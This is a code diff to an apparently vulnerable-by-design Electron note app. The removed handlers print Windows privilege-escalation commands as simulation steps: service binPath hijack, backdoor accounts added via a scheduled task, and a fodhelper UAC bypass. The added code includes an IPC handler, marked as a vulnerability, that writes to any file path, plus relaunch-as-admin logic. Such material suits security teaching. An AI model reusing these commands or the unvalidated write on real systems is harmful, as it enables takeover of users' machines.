@@ -5,6 +5,7 @@ import { BrowserWindow, app, ipcMain, shell } from 'electron'
 import path, { join } from 'path'
 import icon from '../../resources/icon.ico?asset'
 import fs from 'fs'
+import sudoPrompt from 'sudo-prompt'
 
 function createWindow(): void {
   // Create the browser window.
@@ -65,179 +66,6 @@ app.whenReady().then(() => {
   ipcMain.handle('createNote', (_, ...args: Parameters<CreateNote>) => createNote(...args))
   ipcMain.handle('deleteNote', (_, ...args: Parameters<DeleteNote>) => deleteNote(...args))
 
-  // Add these handlers
-  ipcMain.handle('scanPrivilegeEscalation', async () => {
-    try {
-      // In a real tool, we would actually scan the system
-      // For demo purposes, we're simulating a scan
-      
-      const simulatedServicePath = 'C:\\Program Files\\Vulnerable Service\\service.exe';
-      const simulatedTaskPath = 'C:\\Windows\\Tasks\\AdminTask.bat';
-      
-      // Create a log file documenting the scan
-      const userDataPath = app.getPath('userData');
-      const scanLogPath = path.join(userDataPath, 'privesc-scan-log.txt');
-      
-      fs.writeFileSync(
-        scanLogPath,
-        `[PRIVILEGE ESCALATION VULNERABILITY SCAN]\n` +
-        `Time: ${new Date().toISOString()}\n\n` +
-        `This is a simulation of scanning for privilege escalation vulnerabilities.\n` +
-        `In a real security tool, we would check for:\n\n` +
-        `1. Unquoted service paths\n` +
-        `2. Services with weak permissions\n` +
-        `3. Scheduled tasks with modifiable targets\n` +
-        `4. UAC bypass opportunities\n` +
-        `5. AlwaysInstallElevated registry settings\n` +
-        `6. Writeable directories in PATH\n\n` +
-        `Results are simulated for educational purposes.\n`
-      );
-      
-      // Simulated scan results
-      return {
-        scanLogPath,
-        riskScore: 65, // 0-100 score simulating overall risk
-        vulnerabilities: {
-          unquoted: {
-            name: 'Unquoted Service Path',
-            found: true,
-            description: 'Found services with unquoted paths containing spaces',
-            details: `Service: VulnerableService\nPath: ${simulatedServicePath}\nStart Type: Automatic\nUser: LocalSystem`
-          },
-          servicePerms: {
-            name: 'Weak Service Permissions',
-            found: true,
-            description: 'Services with modifiable configurations detected',
-            details: `Service: UpdateService\nPermissions: NT AUTHORITY\\Authenticated Users:(WDAC,WO)\nStart Type: Automatic\nUser: LocalSystem`
-          },
-          scheduledTasks: {
-            name: 'Vulnerable Scheduled Tasks',
-            found: true,
-            description: 'Scheduled tasks with writable targets found',
-            details: `Task: SystemCleanup\nRun As: SYSTEM\nCommand: ${simulatedTaskPath}\nPermissions: BUILTIN\\Users:(W)`
-          },
-          uacBypass: {
-            name: 'UAC Bypass Opportunity',
-            found: false,
-            description: 'No common UAC bypass vectors detected'
-          },
-          alwaysInstallElevated: {
-            name: 'Always Install Elevated',
-            found: false,
-            description: 'AlwaysInstallElevated is not enabled'
-          }
-        }
-      };
-    } catch (error) {
-      console.error('Error in scanPrivilegeEscalation:', error);
-      return { error: (error instanceof Error ? error.message : 'An unknown error occurred') };
-    }
-  });
-
-  ipcMain.handle('simulatePrivilegeEscalation', async (_, vector) => {
-    try {
-      let simulationSteps: string[] = [];
-      let gainedPrivilege = '';
-      
-      // Different simulation steps based on the attack vector
-      switch (vector) {
-        case 'unquoted':
-          simulationSteps = [
-            '[*] Scanning for services with unquoted paths...',
-            '[+] Found vulnerable service: VulnerableService',
-            '[+] Path: C:\\Program Files\\Vulnerable Service\\service.exe',
-            '[*] Checking directory permissions...',
-            '[+] Directory "C:\\Program" is writable!',
-            '[*] Creating malicious executable at C:\\Program.exe',
-            '[*] Waiting for service restart...',
-            '[*] Service restarted!',
-            '[+] Malicious C:\\Program.exe executed with SYSTEM privileges',
-            '[*] Creating backdoor admin account...',
-            '[+] Added user "backdoor" to local administrators group'
-          ];
-          gainedPrivilege = 'SYSTEM';
-          break;
-          
-        case 'service-perms':
-          simulationSteps = [
-            '[*] Scanning for services with weak permissions...',
-            '[+] Found vulnerable service: UpdateService',
-            '[*] Checking service permissions...',
-            '[+] Service configuration is writable by current user!',
-            '[*] Modifying service binary path...',
-            '[>] sc config UpdateService binPath= "C:\\Windows\\Temp\\malicious.exe"',
-            '[*] Binary path modified successfully',
-            '[*] Restarting service...',
-            '[>] sc stop UpdateService',
-            '[>] sc start UpdateService',
-            '[+] Service started our malicious executable with SYSTEM privileges',
-            '[*] Creating persistent backdoor...'
-          ];
-          gainedPrivilege = 'SYSTEM';
-          break;
-          
-        case 'scheduled-tasks':
-          simulationSteps = [
-            '[*] Scanning for vulnerable scheduled tasks...',
-            '[+] Found task: SystemCleanup running as SYSTEM',
-            '[*] Checking target file permissions...',
-            '[+] Target script is writable: C:\\Windows\\Tasks\\AdminTask.bat',
-            '[*] Modifying task script to add backdoor...',
-            '[>] echo net user hacker Password123! /add >> C:\\Windows\\Tasks\\AdminTask.bat',
-            '[>] echo net localgroup administrators hacker /add >> C:\\Windows\\Tasks\\AdminTask.bat',
-            '[*] Waiting for task execution...',
-            '[+] Task executed! Backdoor account created with admin privileges'
-          ];
-          gainedPrivilege = 'Administrator';
-          break;
-          
-        case 'uac-bypass':
-          simulationSteps = [
-            '[*] Checking UAC configuration...',
-            '[+] UAC level: Default',
-            '[*] Looking for auto-elevate binaries...',
-            '[+] Found vulnerable target: fodhelper.exe',
-            '[*] Setting up registry key hijack...',
-            '[>] New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force',
-            '[>] Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(Default)" -Value "C:\\Windows\\Temp\\malicious.exe"',
-            '[*] Executing fodhelper.exe...',
-            '[+] Process launched without UAC prompt!',
-            '[+] Malicious code executed with elevated privileges',
-            '[*] Cleaning up registry keys...'
-          ];
-          gainedPrivilege = 'Administrator';
-          break;
-      }
-      
-      // In a real tool, we would create log files documenting the exploit
-      const userDataPath = app.getPath('userData');
-      const exploitLogPath = path.join(userDataPath, `privesc-${vector}-simulation.txt`);
-      
-      fs.writeFileSync(
-        exploitLogPath,
-        `[PRIVILEGE ESCALATION SIMULATION - ${vector.toUpperCase()}]\n` +
-        `Time: ${new Date().toISOString()}\n\n` +
-        `This is a simulation of exploiting a privilege escalation vulnerability.\n` +
-        `In a real attack scenario, these steps would give an attacker elevated system access.\n\n` +
-        `Simulation steps:\n` +
-        simulationSteps.join('\n') +
-        `\n\nResult: Successfully gained ${gainedPrivilege} privileges\n\n` +
-        `NOTE: This is only a simulation for educational purposes. No actual exploitation occurred.\n`
-      );
-      
-      return {
-        exploitLogPath,
-        simulationSteps,
-        success: true,
-        gainedPrivilege,
-        vector
-      };
-    } catch (error) {
-      console.error(`Error in simulatePrivilegeEscalation (${vector}):`, error);
-      return { success: false, error: error instanceof Error ? error.message : 'An unknown error occurred' };
-    }
-  });
-
   createWindow()
 
   app.on('activate', function () {
@@ -245,6 +73,62 @@ app.whenReady().then(() => {
     // dock icon is clicked and there are no other windows open.
     if (BrowserWindow.getAllWindows().length === 0) createWindow()
   })
+})
+
+ipcMain.on('write-log', (event, text: string, path: string) => {
+  try {
+    // VULNERABILITY: This allows writing to ANY path on the system without validation
+    fs.writeFileSync(path, text)
+    console.log('Log written to', path)
+
+    // Send a success response
+    event.reply('write-log-result', { success: true, path })
+  } catch (err) {
+    console.error('Write failed:', err)
+    event.reply('write-log-result', {
+      success: false,
+      error: err instanceof Error ? err.message : 'An unknown error occurred'
+    })
+  }
+})
+
+ipcMain.handle('relaunch-as-admin', () => {
+  const execPath = process.execPath
+  const options = {
+    name: 'Notety-Desktop'
+  }
+
+  console.log('Attempting to relaunch with admin privileges...')
+  sudoPrompt.exec(`"${execPath}"`, options, (error) => {
+    if (error) {
+      console.error('Failed to relaunch as admin:', error)
+    }
+  })
+
+  // We'll close the current instance since we're relaunching
+  setTimeout(() => app.quit(), 1000)
+  return true
+})
+
+ipcMain.handle('check-admin-status', () => {
+  // Try writing to a truly protected directory (not Temp which might be writable by standard users)
+  try {
+    const testFile = path.join('C:\\Windows\\System32', `admin-test-${Date.now()}.txt`)
+    fs.writeFileSync(testFile, 'Admin test')
+    // If we get here, we have admin rights
+    try {
+      fs.unlinkSync(testFile) // Clean up
+    } catch (e) {
+      console.error('Could not clean up test file:', e)
+    }
+    return true
+  } catch (err) {
+    console.log(
+      'Not running with admin rights:',
+      err instanceof Error ? err.message : 'Unknown error'
+    )
+    return false
+  }
 })
 
 // Quit when all windows are closed, except on macOS. There, it's common
